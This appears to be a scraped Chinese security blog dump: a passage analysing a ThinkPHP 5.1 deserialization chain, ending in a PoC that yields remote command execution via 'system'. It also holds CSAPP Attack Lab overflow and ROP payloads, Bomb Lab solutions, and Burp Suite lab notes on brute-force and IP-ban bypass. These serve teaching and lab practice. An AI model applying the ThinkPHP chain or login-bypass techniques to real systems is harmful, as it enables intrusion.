visible方法且传参可控，这里还有个知识点就是use关键字去继承类 所以我们找到Model.php同时继承如上两个类，但是他是个抽象类，所以又找到他的子类Pivot 接下来的目标就是找一个代码执行的点，有__call方法，但是不存在visible方法。 Request.php中 public function __call($method, $args) { if (array_key_exists($method, $this-&gt;hook)) { array_unshift($args, $this); return call_user_func_array($this-&gt;hook[$method], $args); } throw new Exception('method not exists:' . static::class . '-&gt;' . $method); } 这个hook是可控的，但是那个args经过了array_unshift导致我们这个不可控，但是call_user_func_array(array(任意类,任意方法),$args) ，我们可以调用任意方法，并且再去找一个方法不受这个参数的影响 了解过ThinkPHP 历史 RCE 漏洞的人可能知道， think\\Request 类的 input 方法经常是，相当于 call_user_func($filter,$data) 。但是前面， $args 数组变量的第一个元素，是一个固定死的类对象，所以这里我们不能直接调用 input 方法，而应该寻找调用 input 的方法。 我们找到input方法 public function input($data = [], $name = '', $default = null, $filter = '') { if (false === $name) { // 获取原始数据 return $data; } $name = (string) $name; if ('' != $name) { // 解析name if (strpos($name, '/')) { list($name, $type) = explode('/', $name); } $data = $this-&gt;getData($data, $name); if (is_null($data)) { return $default; } if (is_object($data)) { return $data; } } // 解析过滤器 $filter = $this-&gt;getFilter($filter, $default); if (is_array($data)) { array_walk_recursive($data, [$this, 'filterValue'], $filter); if (version_compare(PHP_VERSION, '7.1.0', '&lt;')) { // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针 $this-&gt;arrayReset($data); } } else { $this-&gt;filterValue($data, $name, $filter); } if (isset($type) &amp;&amp; $data !== $default) { // 强制类型转换 $this-&gt;typeCast($data, $type); } return $data; } 其中有一个filterValue private function filterValue(&amp;$value, $key, $filters) { $default = array_pop($filters); foreach ($filters as $filter) { if (is_callable($filter)) { // 调用函数或者方法过滤 $value = call_user_func($filter, $value); } elseif (is_scalar($value)) { if (false !== strpos($filter, '/')) { // 正则过滤 if (!preg_match($filter, $value)) { // 匹配不成功返回默认值 $value = $default; break; } } elseif (!empty($filter)) { // filter函数不存在时, 则使用filter_var进行过滤 // filter为非整形值时, 调用filter_id取得过滤id $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter)); if (false === $value) { $value = $default; break; } } } } return $value; } 我们可以发现$value = call_user_func($filter, $value);，这里的$value是不可控的，这个是input的$data传入的，然后我们找到param，发现它在最后调用input public function param($name = '', $default = null, $filter = ''){ if (!$this-&gt;mergeParam) { $method = $this-&gt;method(true); // 自动获取请求变量 switch ($method) { case 'POST': $vars = $this-&gt;post(false); break; case 'PUT': case 'DELETE': case 'PATCH': $vars = $this-&gt;put(false); break; default: $vars = []; } // 当前请求参数和URL地址中的参数合并 $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false)); $this-&gt;mergeParam = true; } if (true === $name) { // 获取包含文件上传信息的数组 $file = $this-&gt;file(); $data = is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param; return $this-&gt;input($data, '', $default, $filter); } return $this-&gt;input($this-&gt;param, $name, $default, $filter);} param可以通过GET方法传入，但是$name是传入的，所以我们继续找，发现isAjax public function isAjax($ajax = false) { $value = $this-&gt;server('HTTP_X_REQUESTED_WITH'); $result = 'xmlhttprequest' == strtolower($value) ? true : false; if (true === $ajax) { return $result; } $result = $this-&gt;param($this-&gt;config['var_ajax']) ? true : $result; $this-&gt;mergeParam = false; return $result; } 这里把$this-&gt;config['var_ajax']传入param的$name 接着我们回头看call_user_func($filter, $value);，filter传入system，value传入命令，filter是filters数组里的，value是在input传入的，然后我们在input中调用filterValue的array_walk_recursive($data, [$this, 'filterValue'], $filter);,这里调用filterValue，作用在$data，然后$filter是传入filterValue方法里的第三个参数filters，他是通过getFilter获取 protected function getFilter($filter, $default) { if (is_null($filter)) { $filter = []; } else { $filter = $filter ?: $this-&gt;filter; if (is_string($filter) &amp;&amp; false === strpos($filter, '/')) { $filter = explode(',', $filter); } else { $filter = (array) $filter; } } $filter[] = $default; return $filter; } 注意看$filter = $filter ?: $this-&gt;filter;，可控 在input中$data = $this-&gt;getData($data, $name); protected function getData(array $data, $name) { foreach (explode('.', $name) as $val) { if (isset($data[$val])) { $data = $data[$val]; } else { return; } } return $data; } 所以$data = $data[$name]，它就是get和post的所有参数 最后看我们RCE的地方 private function filterValue(&amp;$value, $key, $filters) { $default = array_pop($filters); foreach ($filters as $filter) { if (is_callable($filter)) { // 调用函数或者方法过滤 $value = call_user_func($filter, $value); ....省略 value就是通过GET请求得到的input.data值 key就是GET的键 filter就是input.filter POC&lt;?php namespace think\\process\\pipes; use think\\model\\Pivot; class Windows{ private $files = []; public function __construct(){ $this-&gt;files=[new Pivot()]; } } namespace think; abstract class Model{ protected $append=[]; private $data=[]; public function __construct(){ $this-&gt;append=[&quot;qqw&quot;=&gt;['lnk']]; $this-&gt;data=[&quot;qqw&quot;=&gt;new Request()]; } } namespace think; class Request{ protected $hook = []; protected $filter; protected $config; public function __construct() { $this-&gt;hook['visible'] = [$this, 'isAjax']; $this-&gt;filter = &quot;system&quot;; } } namespace think\\model; use think\\Model; class Pivot extends Model{ } use think\\process\\pipes\\Windows; echo urlencode(serialize(new Windows())); $this-&gt;append=[&quot;qqw&quot;=&gt;['lnk']];满足append不为空，且键在data数组中 $this-&gt;data=[&quot;qqw&quot;=&gt;new Request()];返回Request()对象 $this-&gt;hook['visible'] = [$this, 'isAjax'];为了在__call方法中调用isAjax $this-&gt;filter = &quot;system&quot;;则是要执行的函数 参考https://ch1e.cn/2022/05/28/tp51/#%E5%89%8D%E8%A8%80 https://zeo.cool/2019/12/18/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90pop%E5%88%A9%E7%94%A8%E9%93%BE/","link":"/2022/09/12/TP51/"},{"title":"CSAPP之Attack LAB","text":"接着Boom lab，同样是第三章里的（虽然我书没咋看 level1void test() { int val; val = getbuf(); printf(&quot;No exploit. Getbuf returned 0x%x\\n&quot;, val); } 由getbuf函数输入，gdb调一下看下buf距离rbp有0x28个字节，直接填充返回到touch1地址就行 exp touch1 = 0x04017c0payload1 = b'a' * 0x28 + p64(touch1)io.sendline(payload1) level2level2多了一个判断，判断传入的参数和文件所给的cookie值是否相同，但这里我们无法直接传参进touch2函数，不过我们调试可以知道，0x55586000-0x55686000这一段是有rwx权限的，就可以执行shellcode. 通过汇编可以看到在getbuf函数执行mov rdi, rsp此时rdi=rsp，作为Gets()的参数buf，意思就是输入字符串的起始地址就是下图rsp的地址0x5561dc78,刚好也处在上面那一段中 exp touch2 = 0x04017ecstack = 0x5561dc78payload2 = asm('mov rdi, 0x59b997fa;ret')payload2 = payload2.ljust(0x28, b'\\x00')payload2 += p64(stack) + p64(touch2)io.sendline(payload2) level3文件给了提示，传字符串的地址，于是先把字符串放前面，后面接地址 exp touch3 = 0x4018fastack = 0x5561dc78payload3 = b'59b997fa' + asm('mov rdi, 0x5561dc78;ret')payload3 = payload3.ljust(0x28, b'\\x00')payload3 += p64(stack+0x8) + p64(touch3) level4简单的ROP，找个pop rdi就行 exp pop_rdi_ret = 0x000000000040141bcookie = 0x59b997fatouch2 = 0x4017ecpayload4 = b'a' * 0x28 + p64(pop_rdi_ret) + p64(cookie) + p64(touch2)io.sendline(payload4) level5Todo…","link":"/2022/02/10/attack/"},{"title":"CSAPP之Bomb LAB","text":"Bomb LAB phase_1直接IDA或者gdb断点进去看到一个比较函数，字符串为Border relations with Canada have never been better.直接输入过第一关 phase_2因为是学习，尽量不用IDA的F5，锻炼看汇编的能力，用gdb查看炸弹函数的汇编代码 0x0000000000400efc &lt;+0&gt;: push rbp0x0000000000400efd &lt;+1&gt;: push rbx0x0000000000400efe &lt;+2&gt;: sub rsp,0x280x0000000000400f02 &lt;+6&gt;: mov rsi,rsp0x0000000000400f05 &lt;+9&gt;: call 0x40145c &lt;read_six_numbers&gt; #要传6个参数，否则bomb0x0000000000400f0a &lt;+14&gt;: cmp DWORD PTR [rsp],0x1 #第一个参数一定要是10x0000000000400f0e &lt;+18&gt;: je 0x400f30 &lt;phase_2+52&gt;0x0000000000400f10 &lt;+20&gt;: call 0x40143a &lt;explode_bomb&gt;0x0000000000400f15 &lt;+25&gt;: jmp 0x400f30 &lt;phase_2+52&gt;0x0000000000400f17 &lt;+27&gt;: mov eax,DWORD PTR [rbx-0x4]0x0000000000400f1a &lt;+30&gt;: add eax,eax0x0000000000400f1c &lt;+32&gt;: cmp DWORD PTR [rbx],eax0x0000000000400f1e &lt;+34&gt;: je 0x400f25 &lt;phase_2+41&gt;0x0000000000400f20 &lt;+36&gt;: call 0x40143a &lt;explode_bomb&gt;0x0000000000400f25 &lt;+41&gt;: add rbx,0x40x0000000000400f29 &lt;+45&gt;: cmp rbx,rbp0x0000000000400f2c &lt;+48&gt;: jne 0x400f17 &lt;phase_2+27&gt;0x0000000000400f2e &lt;+50&gt;: jmp 0x400f3c &lt;phase_2+64&gt;0x0000000000400f30 &lt;+52&gt;: lea rbx,[rsp+0x4]0x0000000000400f35 &lt;+57&gt;: lea rbp,[rsp+0x18]0x0000000000400f3a &lt;+62&gt;: jmp 0x400f17 &lt;phase_2+27&gt;0x0000000000400f3c &lt;+64&gt;: add rsp,0x280x0000000000400f40 &lt;+68&gt;: pop rbx0x0000000000400f41 &lt;+69&gt;: pop rbp0x0000000000400f42 &lt;+70&gt;: ret 传入参数通过rbx来寻址，逻辑是一个简单的首项为1，公比为2的等比数列，所以我们传入的应该为1 2 4 8 16 32 看到+57处有个lea rbp,[rsp+0x18]，这里是相当于设置一个比较值，判断是否循环有6次了，因为 0x18 = 2424 / 4 = 6 因为每次写下一题都要先过上一题，所以这里建议将答案写在一个文件里，方便下断点调试，在gdb里就可以直接 例如 b *(0x0x0000000000400f5b) r exp.txt phase_3先看汇编 0x0000000000400f43 &lt;+0&gt;: sub rsp,0x180x0000000000400f47 &lt;+4&gt;: lea rcx,[rsp+0xc]0x0000000000400f4c &lt;+9&gt;: lea rdx,[rsp+0x8]0x0000000000400f51 &lt;+14&gt;: mov esi,0x4025cf/*x/s 0x4025cf0x4025cf: &quot;%d %d&quot;读入两个参数*/0x0000000000400f56 &lt;+19&gt;: mov eax,0x00x0000000000400f5b &lt;+24&gt;: call 0x400bf0 &lt;__isoc99_sscanf@plt&gt; #返回值要大于10x0000000000400f60 &lt;+29&gt;: cmp eax,0x10x0000000000400f63 &lt;+32&gt;: jg 0x400f6a &lt;phase_3+39&gt;0x0000000000400f65 &lt;+34&gt;: call 0x40143a &lt;explode_bomb&gt;0x0000000000400f6a &lt;+39&gt;: cmp DWORD PTR [rsp+0x8],0x7 #第一个参数值不能大于7， 否则bomb0x0000000000400f6f &lt;+44&gt;: ja 0x400fad &lt;phase_3+106&gt;0x0000000000400f71 &lt;+46&gt;: mov eax,DWORD PTR [rsp+0x8]0x0000000000400f75 &lt;+50&gt;: jmp QWORD PTR [rax*8+0x402470]0x0000000000400f7c &lt;+57&gt;: mov eax,0xcf0x0000000000400f81 &lt;+62&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x0000000000400f83 &lt;+64&gt;: mov eax,0x2c30x0000000000400f88 &lt;+69&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x0000000000400f8a &lt;+71&gt;: mov eax,0x1000x0000000000400f8f &lt;+76&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x0000000000400f91 &lt;+78&gt;: mov eax,0x1850x0000000000400f96 &lt;+83&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x0000000000400f98 &lt;+85&gt;: mov eax,0xce0x0000000000400f9d &lt;+90&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x0000000000400f9f &lt;+92&gt;: mov eax,0x2aa0x0000000000400fa4 &lt;+97&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x0000000000400fa6 &lt;+99&gt;: mov eax,0x1470x0000000000400fab &lt;+104&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x0000000000400fad &lt;+106&gt;: call 0x40143a &lt;explode_bomb&gt;0x0000000000400fb2 &lt;+111&gt;: mov eax,0x00x0000000000400fb7 &lt;+116&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x0000000000400fb9 &lt;+118&gt;: mov eax,0x1370x0000000000400fbe &lt;+123&gt;: cmp eax,DWORD PTR [rsp+0xc]0x0000000000400fc2 &lt;+127&gt;: je 0x400fc9 &lt;phase_3+134&gt;0x0000000000400fc4 &lt;+129&gt;: call 0x40143a &lt;explode_bomb&gt;0x0000000000400fc9 &lt;+134&gt;: add rsp,0x180x0000000000400fcd &lt;+138&gt;: ret 熟悉的师傅可以看到0x0000000000400f75 &lt;+50&gt;: jmp QWORD PTR [rax*8+0x402470]这是一个典型switch语句实现，并且有一串的mov jmp，也可用IDA反汇编看看伪C代码，我们可以发现，所有分支都会跳到0x0000000000400fb9的位置，比较eax 和 我们输入的第二个参数 所以这里我输入 1 311 phase_4这里有两个函数，首先看炸弹 0x000000000040100c &lt;+0&gt;: sub rsp,0x180x0000000000401010 &lt;+4&gt;: lea rcx,[rsp+0xc] #参数20x0000000000401015 &lt;+9&gt;: lea rdx,[rsp+0x8] #参数10x000000000040101a &lt;+14&gt;: mov esi,0x4025cf # %d %d0x000000000040101f &lt;+19&gt;: mov eax,0x0 #eax = 00x0000000000401024 &lt;+24&gt;: call 0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x0000000000401029 &lt;+29&gt;: cmp eax,0x2 #两个数字，否则bomb0x000000000040102c &lt;+32&gt;: jne 0x401035 &lt;phase_4+41&gt;0x000000000040102e &lt;+34&gt;: cmp DWORD PTR [rsp+0x8],0xe # 1参 &lt;= 0xe0x0000000000401033 &lt;+39&gt;: jbe 0x40103a &lt;phase_4+46&gt;0x0000000000401035 &lt;+41&gt;: call 0x40143a &lt;explode_bomb&gt;0x000000000040103a &lt;+46&gt;: mov edx,0xe #edx = 0xe0x000000000040103f &lt;+51&gt;: mov esi,0x0 #esi = 00x0000000000401044 &lt;+56&gt;: mov edi,DWORD PTR [rsp+0x8] #edi = 1参数0x0000000000401048 &lt;+60&gt;: call 0x400fce &lt;func4&gt;0x000000000040104d &lt;+65&gt;: test eax,eax #测试eax是否为空，是空则跳转，bomb0x000000000040104f &lt;+67&gt;: jne 0x401058 &lt;phase_4+76&gt; 0x0000000000401051 &lt;+69&gt;: cmp DWORD PTR [rsp+0xc],0x0 #2参为0，则跳转0x0000000000401056 &lt;+74&gt;: je 0x40105d &lt;phase_4+81&gt;0x0000000000401058 &lt;+76&gt;: call 0x40143a &lt;explode_bomb&gt;0x000000000040105d &lt;+81&gt;: add rsp,0x180x0000000000401061 &lt;+85&gt;: ret 这里我们知道输入两个参数，且参数2为0，参数1 &lt;= 0xe，接着看func4 # edx = i, esi = j, edi = k, eax = result0x0000000000400fce &lt;+0&gt;: sub rsp,0x80x0000000000400fd2 &lt;+4&gt;: mov eax,edx # eax = i0x0000000000400fd4 &lt;+6&gt;: sub eax,esi # num = i - j0x0000000000400fd6 &lt;+8&gt;: mov ecx,eax # val = num0x0000000000400fd8 &lt;+10&gt;: shr ecx,0x1f # val = num &gt;&gt; 0x1f = 0 0x0000000000400fdb &lt;+13&gt;: add eax,ecx # temp = num + val 判断符号0x0000000000400fdd &lt;+15&gt;: sar eax,1 # temp = temp / 2 0x0000000000400fdf &lt;+17&gt;: lea ecx,[rax+rsi*1] # (i/2 - j/2 + j) == (i + j) / 2;0x0000000000400fe2 &lt;+20&gt;: cmp ecx,edi # temp,k0x0000000000400fe4 &lt;+22&gt;: jle 0x400ff2 &lt;func4+36&gt;0x0000000000400fe6 &lt;+24&gt;: lea edx,[rcx-0x1] # i = temp - 10x0000000000400fe9 &lt;+27&gt;: call 0x400fce &lt;func4&gt;0x0000000000400fee &lt;+32&gt;: add eax,eax # return result * 20x0000000000400ff0 &lt;+34&gt;: jmp 0x401007 &lt;func4+57&gt;0x0000000000400ff2 &lt;+36&gt;: mov eax,0x0 # return result = 00x0000000000400ff7 &lt;+41&gt;: cmp ecx,edi0x0000000000400ff9 &lt;+43&gt;: jge 0x401007 &lt;func4+57&gt;0x0000000000400ffb &lt;+45&gt;: lea esi,[rcx+0x1] # j = temp + 10x0000000000400ffe &lt;+48&gt;: call 0x400fce &lt;func4&gt;0x0000000000401003 &lt;+53&gt;: lea eax,[rax+rax*1+0x1] # return result * 2 + 10x0000000000401007 &lt;+57&gt;: add rsp,0x80x000000000040100b &lt;+61&gt;: ret 可以发现是个递归函数,跟着汇编一步一步把C代码写出来，写个脚本求出值，这个还是花了不少时间，对汇编的结构还是不太熟悉，太🥬了 exp #include &quot;stdio.h&quot;int func4(int k, int j, int i){ // edx = i, esi = j, edi = k int val, temp, result; val = (i - j) &gt;&gt; 0x1f; temp = (i-j) + val; temp = temp &gt;&gt; 1; temp += j; if(temp &gt; k) { return 2 * func4(k, j, temp - 1); } result = 0; if(temp &lt; k) { return 2 * func4(k, temp + 1, i) + 1; } return result;}int main(void){ for (int k = 0; k &lt;= 14; ++k) { if(func4(k, 0, 14) == 0) { printf(&quot;%d &quot;, k); } } return 0;} 有四个答案，随便填一个就行 phase_50x0000000000401062 &lt;+0&gt;: push rbx0x0000000000401063 &lt;+1&gt;: sub rsp,0x200x0000000000401067 &lt;+5&gt;: mov rbx,rdi0x000000000040106a &lt;+8&gt;: mov rax,QWORD PTR fs:0x280x0000000000401073 &lt;+17&gt;: mov QWORD PTR [rsp+0x18],rax #熟悉的canary，不过好像没啥用0x0000000000401078 &lt;+22&gt;: xor eax,eax0x000000000040107a &lt;+24&gt;: call 0x40131b &lt;string_length&gt;0x000000000040107f &lt;+29&gt;: cmp eax,0x6 #读入长度为6的字符串0x0000000000401082 &lt;+32&gt;: je 0x4010d2 &lt;phase_5+112&gt;0x0000000000401084 &lt;+34&gt;: call 0x40143a &lt;explode_bomba&gt;0x0000000000401089 &lt;+39&gt;: jmp 0x4010d2 &lt;phase_5+112&gt;0x000000000040108b &lt;+41&gt;: movzx ecx,BYTE PTR [rbx+rax*1]0x000000000040108f &lt;+45&gt;: mov BYTE PTR [rsp],cl0x0000000000401092 &lt;+48&gt;: mov rdx,QWORD PTR [rsp]0x0000000000401096 &lt;+52&gt;: and edx,0xf #获取当前字符串(rcx寄存器处)的后四位0x0000000000401099 &lt;+55&gt;: movzx edx,BYTE PTR [rdx+0x4024b0] #以rdx为索引，从0x4024b0处的字符串中取出字符0x00000000004010a0 &lt;+62&gt;: mov BYTE PTR [rsp+rax*1+0x10],dl #存起来0x00000000004010a4 &lt;+66&gt;: add rax,0x1 #相当于循环计数器0x00000000004010a8 &lt;+70&gt;: cmp rax,0x60x00000000004010ac &lt;+74&gt;: jne 0x40108b &lt;phase_5+41&gt;0x00000000004010ae &lt;+76&gt;: mov BYTE PTR [rsp+0x16],0x00x00000000004010b3 &lt;+81&gt;: mov esi,0x40245e # 要比较的字符串 ---&gt; flyers0x00000000004010b8 &lt;+86&gt;: lea rdi,[rsp+0x10]0x00000000004010bd &lt;+91&gt;: call 0x401338 &lt;strings_not_equal&gt;0x00000000004010c2 &lt;+96&gt;: test eax,eax0x00000000004010c4 &lt;+98&gt;: je 0x4010d9 &lt;phase_5+119&gt;0x00000000004010c6 &lt;+100&gt;: call 0x40143a &lt;explode_bomb&gt;0x00000000004010cb &lt;+105&gt;: nop DWORD PTR [rax+rax*1+0x0]0x00000000004010d0 &lt;+110&gt;: jmp 0x4010d9 &lt;phase_5+119&gt;0x00000000004010d2 &lt;+112&gt;: mov eax,0x00x00000000004010d7 &lt;+117&gt;: jmp 0x40108b &lt;phase_5+41&gt;0x00000000004010d9 &lt;+119&gt;: mov rax,QWORD PTR [rsp+0x18]0x00000000004010de &lt;+124&gt;: xor rax,QWORD PTR fs:0x280x00000000004010e7 &lt;+133&gt;: je 0x4010ee &lt;phase_5+140&gt;0x00000000004010e9 &lt;+135&gt;: call 0x400b30 &lt;__stack_chk_fail@plt&gt;0x00000000004010ee &lt;+140&gt;: add rsp,0x200x00000000004010f2 &lt;+144&gt;: pop rbx0x00000000004010f3 &lt;+145&gt;: ret 大概意思就是对你输入的字符串每一个字符进行一顿操作，简单来说就是对每个字符进行&amp; 0xf运算，然后将这个数当作索引，到上图第一个字符串里找到对应的那个字符存起来，把六位字符都处理成新字符在与后面那个字符串进行比较，相同就过关，可以写个脚本 exp data = [9, 15, 14, 5, 6, 7]payload = ''for k in range(0, 6): for i in range(97, 123): t = i &amp; 0xf if t == data[k]: payload += chr(i) breakprint(payload)#ionefg#当然答案不止这一个 这个更像逆向密码题.. phase_6这题确实难，最好是分成一部分一部分地去分析，很多时候跳来跳去，寄存器的值根本记不清（寄，还好有强大的gdb 0x00000000004010f4 &lt;+0&gt;: push r140x00000000004010f6 &lt;+2&gt;: push r130x00000000004010f8 &lt;+4&gt;: push r120x00000000004010fa &lt;+6&gt;: push rbp0x00000000004010fb &lt;+7&gt;: push rbx0x00000000004010fc &lt;+8&gt;: sub rsp,0x500x0000000000401100 &lt;+12&gt;: mov r13,rsp #r13 = rsp0x0000000000401103 &lt;+15&gt;: mov rsi,rsp #rsi = rsp0x0000000000401106 &lt;+18&gt;: call 0x40145c &lt;read_six_numbers&gt; #经典六个数0x000000000040110b &lt;+23&gt;: mov r14,rsp #r14 = rsp = r13 = rsi0x000000000040110e &lt;+26&gt;: mov r12d,0x0 #r12d = 00x0000000000401114 &lt;+32&gt;: mov rbp,r13 #rbp = r13 = rsp0x0000000000401117 &lt;+35&gt;: mov eax,DWORD PTR [r13] #rax = num[i]0x000000000040111b &lt;+39&gt;: sub eax,0x1 #num[i] - 10x000000000040111e &lt;+42&gt;: cmp eax,0x50x0000000000401121 &lt;+45&gt;: jbe 0x401128 &lt;phase_6+52&gt; # num[i] &lt;= 60x0000000000401123 &lt;+47&gt;: call 0x40143a &lt;explode_bomb&gt;每个数要小于等于6&lt;----------------------------------------------------------------------------------------&gt;0x0000000000401128 &lt;+52&gt;: add r12d,0x1 #r12d += 10x000000000040112c &lt;+56&gt;: cmp r12d,0x6 #计数器0x0000000000401130 &lt;+60&gt;: je 0x401153 &lt;phase_6+95&gt;0x0000000000401132 &lt;+62&gt;: mov ebx,r12d 0x0000000000401135 &lt;+65&gt;: movsxd rax,ebx 0x0000000000401138 &lt;+68&gt;: mov eax,DWORD PTR [rsp+rax*4] #eax = num[i+1]0x000000000040113b &lt;+71&gt;: cmp DWORD PTR [rbp+0x0],eax #比较num[i]和num[i+1]0x000000000040113e &lt;+74&gt;: jne 0x401145 &lt;phase_6+81&gt;0x0000000000401140 &lt;+76&gt;: call 0x40143a &lt;explode_bomb&gt;0x0000000000401145 &lt;+81&gt;: add ebx,0x1 #ebx += 1 0x0000000000401148 &lt;+84&gt;: cmp ebx,0x5 #计数器0x000000000040114b &lt;+87&gt;: jle 0x401135 &lt;phase_6+65&gt;0x000000000040114d &lt;+89&gt;: add r13,0x4 #r13 += 40x0000000000401151 &lt;+93&gt;: jmp 0x401114 &lt;phase_6+32&gt;六个数各不相等，所以一定是 1 2 3 4 5 6 这六个数之间排序&lt;----------------------------------------------------------------------------------------&gt;0x0000000000401153 &lt;+95&gt;: lea rsi,[rsp+0x18] #rsi = [rsp+0x18] = 0x000x0000000000401158 &lt;+100&gt;: mov rax,r14 #rax = r14 = rsp0x000000000040115b &lt;+103&gt;: mov ecx,0x7 #ecx = 0x70x0000000000401160 &lt;+108&gt;: mov edx,ecx #edx = 0x70x0000000000401162 &lt;+110&gt;: sub edx,DWORD PTR [rax] # edx = 7 - num[i]0x0000000000401164 &lt;+112&gt;: mov DWORD PTR [rax],edx # 再把相减后的值放到rax里0x0000000000401166 &lt;+114&gt;: add rax,0x4 #rax-&gt;num[i+1]0x000000000040116a &lt;+118&gt;: cmp rax,rsi #比较num[i+1]与00x000000000040116d &lt;+121&gt;: jne 0x401160 &lt;phase_6+108&gt;将所有值变为 7-num[i]&lt;----------------------------------------------------------------------------------------&gt;0x000000000040116f &lt;+123&gt;: mov esi,0x0 #esi = 00x0000000000401174 &lt;+128&gt;: jmp 0x401197 &lt;phase_6+163&gt;0x0000000000401176 &lt;+130&gt;: mov rdx,QWORD PTR [rdx+0x8] #指向下一个值0x000000000040117a &lt;+134&gt;: add eax,0x10x000000000040117d &lt;+137&gt;: cmp eax,ecx #循环累加eax0x000000000040117f &lt;+139&gt;: jne 0x401176 &lt;phase_6+130&gt;0x0000000000401181 &lt;+141&gt;: jmp 0x401188 &lt;phase_6+148&gt;0x0000000000401183 &lt;+143&gt;: mov edx,0x6032d00x0000000000401188 &lt;+148&gt;: mov QWORD PTR [rsp+rsi*2+0x20],rdx #rdx-&gt;node6(0x1bb)0x000000000040118d &lt;+153&gt;: add rsi,0x40x0000000000401191 &lt;+157&gt;: cmp rsi,0x18 #0x18 = 24 循环6次0x0000000000401195 &lt;+161&gt;: je 0x4011ab &lt;phase_6+183&gt;0x0000000000401197 &lt;+163&gt;: mov ecx,DWORD PTR [rsp+rsi*1] # ecx = 7-num[i]0x000000000040119a &lt;+166&gt;: cmp ecx,0x1 ecx &lt;= 0x10x000000000040119d &lt;+169&gt;: jle 0x401183 &lt;phase_6+143&gt;0x000000000040119f &lt;+171&gt;: mov eax,0x1 #eax = 10x00000000004011a4 &lt;+176&gt;: mov edx,0x6032d0 #奇怪的地址，见下面截图0x00000000004011a9 &lt;+181&gt;: jmp 0x401176 &lt;phase_6+130&gt;&lt;----------------------------------------------------------------------------------------&gt;node[i]-&gt;next = node[i-1];类似遍历链表0x00000000004011ab &lt;+183&gt;: mov rbx,QWORD PTR [rsp+0x20]0x00000000004011b0 &lt;+188&gt;: lea rax,[rsp+0x28]0x00000000004011b5 &lt;+193&gt;: lea rsi,[rsp+0x50]0x00000000004011ba &lt;+198&gt;: mov rcx,rbx0x00000000004011bd &lt;+201&gt;: mov rdx,QWORD PTR [rax]0x00000000004011c0 &lt;+204&gt;: mov QWORD PTR [rcx+0x8],rdx0x00000000004011c4 &lt;+208&gt;: add rax,0x80x00000000004011c8 &lt;+212&gt;: cmp rax,rsi0x00000000004011cb &lt;+215&gt;: je 0x4011d2 &lt;phase_6+222&gt;0x00000000004011cd &lt;+217&gt;: mov rcx,rdx0x00000000004011d0 &lt;+220&gt;: jmp 0x4011bd &lt;phase_6+201&gt;&lt;----------------------------------------------------------------------------------------&gt;0x00000000004011d2 &lt;+222&gt;: mov QWORD PTR [rdx+0x8],0x00x00000000004011da &lt;+230&gt;: mov ebp,0x50x00000000004011df &lt;+235&gt;: mov rax,QWORD PTR [rbx+0x8]0x00000000004011e3 &lt;+239&gt;: mov eax,DWORD PTR [rax]0x00000000004011e5 &lt;+241&gt;: cmp DWORD PTR [rbx],eax0x00000000004011e7 &lt;+243&gt;: jge 0x4011ee &lt;phase_6+250&gt;0x00000000004011e9 &lt;+245&gt;: call 0x40143a &lt;explode_bomb&gt;0x00000000004011ee &lt;+250&gt;: mov rbx,QWORD PTR [rbx+0x8]0x00000000004011f2 &lt;+254&gt;: sub ebp,0x10x00000000004011f5 &lt;+257&gt;: jne 0x4011df &lt;phase_6+235&gt;0x00000000004011f7 &lt;+259&gt;: add rsp,0x500x00000000004011fb &lt;+263&gt;: pop rbx0x00000000004011fc &lt;+264&gt;: pop rbp0x00000000004011fd &lt;+265&gt;: pop r120x00000000004011ff &lt;+267&gt;: pop r130x0000000000401201 &lt;+269&gt;: pop r140x0000000000401203 &lt;+271&gt;: ret 前面存着输入的值，后面存着后一个值的地址，加上node的字眼，明显就是链表的结构（虽然我数据结构没学好，我爬 稍微算算大概写出这个结构体 struct node{ int value; //4 node节点存储的数据 int index; //4 表示是在节点第几个元素 node* next; //8 指向下一个节点};hex-&gt;dec0x14-&gt;1-&gt;3320xa8-&gt;2-&gt;1680x39c-&gt;3-&gt;9240x2b3-&gt;4-&gt;6910x1dd-&gt;5-&gt;4770x1bb-&gt;6-&gt;4437-num[i] -&gt; valuevalue从大到小排列3 4 5 6 1 2所以输入序列应该为4 3 2 1 6 5 这就拆完了六个关卡的炸弹 To Do…","link":"/2022/01/27/bomb/"},{"title":"Burpsuite靶场----身份认证专题","text":"身份认证专题 Burp Intruder模块方法 其中里面的正则提取功能真的很强大很好用 Lab: Username enumeration via response timing通过登录成功与否页面响应的时间不同来判断 首先，尝试多次失败会被ban掉ip，这里我们可以构造XFF头来绕过，X-Forwarded-For: 3737 其次，如果用户名无效，则页面时间响应差不多，但是如果用户名是对的，页面响应时间就会和密码长度有关，所以题目给了一个正确的用户名和密码，方便观察测试 然后就是正常的爆破，用pitchfork模式 – 每一个变量标记对应一个字典，一一对应进行破解。 Flawed brute-force protection防止暴力破解最常见有效的两种方法就是 如果尝试登录失败次数过多封锁ip 如果尝试快速登录很多次阻止远程ip 而这两种方法，都有缺陷，因为它会以登录成功来重置这个登录的计数器，比如这个实验允许登录三次，我们就可以在三次内成功一次就可以又有三次机会，而我们只需要一个已经知道的账户 所以我们可以构造这样的字典 账户 密码 奇数为我们需要爆破的密码，偶数则为已知的密码 注意爆破的时候把线程调小，防止线程太大依然会导致登录过快 Account locking账户锁定，因为也是会将”该用户已锁定”之类的字样显示在响应包中的，所以也可以用于枚举用户名 有一个用户名的字典，其中包括了有效的用户，随便一个密码，用burp爆破，每个账户都爆破设置的阙值次数，而有效的账户他返回的包长度比其他的大（因为有”该用户已锁定”类似的字样） 然后就可以根据这个已知的用户名去爆破其密码 因为有些人喜欢将不同网站密码设置成相同的，这就导致如果他们其中一个账户密码泄漏以后可以用来登录其他账户，并且因为只尝试一次而无法触发该防护手段 Lab: Broken brute-force protection, multiple credentials per request用户登录有频率限制 可以将username和password组合成字典形式，以json格式发包一次发出去，让系统一个一个对比 这里放一个小脚本，转化下格式 